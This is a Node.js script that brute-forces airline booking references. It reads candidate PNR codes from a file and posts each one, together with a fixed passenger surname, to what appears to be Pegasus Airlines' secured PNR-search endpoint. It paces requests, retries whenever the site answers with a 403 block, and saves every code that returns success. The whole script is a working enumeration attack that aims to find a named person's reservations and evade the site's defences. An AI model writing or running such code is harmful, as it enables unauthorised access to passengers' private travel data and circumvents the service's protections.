const fs = require('fs');
const axios = require('axios');

const fileContent = fs.readFileSync('output.txt', 'utf-8');
const values = fileContent.trim().split('\n'); // assuming each value is on a separate line

let counter = 0;
let errors = 0;
let start = Date.now();
let requestsPerMinute = 0;

const sendRequest = (value) => {
  axios.post('https://web.flypgs.com/pegasus/pnr-search/filtered/secured', {
    pnrNo: value.trim(),
    surname: 'ASLANBAŞ'
  }, {
    headers: {
      'Accept': 'application/json, text/plain, */*',
      'Accept-Encoding': 'gzip, deflate',
      'Content-Type': 'application/json',
      'X-Platform': 'web',
      'Cache-Control': 'no-cache, no-store, must-revalidate'
    }
  })
  .then(response => {
    if (response.status === 200) {
      console.log(`Response status: ${response.status}, pnrNo: ${value.trim()}`);
      fs.appendFileSync('status_codes.txt', `${value.trim()}\n`);
    } else {
      console.error(`Unexpected response status: ${response.status}, pnrNo: ${value.trim()}`);
    }
  })
  .catch(error => {
    if (error.response.status === 403) {
      console.log(`Got 403, waiting 5 seconds and trying again...`);
      setTimeout(() => {
        sendRequest(value);
      }, 5000);
    } else {
      console.error(`Error: ${error.message}, pnrNo: ${value.trim()}`);
      errors++;
    }
  });
}

const intervalId = setInterval(() => {
  if (counter < values.length) {
    sendRequest(values[counter]);
    counter++;
    requestsPerMinute++;
  } else {
    clearInterval(intervalId);
    console.log(`All requests sent. Total: ${values.length}, errors: ${errors}`);
  }

  const elapsedSeconds = (Date.now() - start) / 1000;
  if (elapsedSeconds >= 60) {
    console.log(`${requestsPerMinute} requests sent in the last 60 seconds.`);
    start = Date.now();
    requestsPerMinute = 0;
  }
}, 350);
